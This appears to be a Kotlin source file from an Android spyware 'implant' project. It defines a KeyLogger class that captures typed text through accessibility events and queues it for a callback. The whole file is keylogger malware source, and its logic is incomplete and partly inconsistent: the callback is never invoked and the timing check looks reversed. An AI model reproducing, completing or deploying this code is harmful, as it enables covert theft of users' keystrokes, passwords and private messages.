package com.cooperthecoder.implant

import android.view.accessibility.AccessibilityEvent
import java.util.*

class KeyLogger(val callback: (String) -> Unit) {

    val keyEventQueue: Queue<AccessibilityEvent> = LinkedList<AccessibilityEvent>()

    fun recordKeystroke(keyEvent: AccessibilityEvent) {
        val top = keyEventQueue.peek()
        if (top != null && top.eventTime - keyEvent.eventTime < Config.KEY_PRESS_TIMEOUT) {
            // Duplicate event from Android: ignore
            return
        }


        val keystroke = keyEvent.source?.text?.toString() ?: return
        when (keystroke) {
            else -> {
                keyEventQueue.add(keyEvent)
            }
        }
    }
}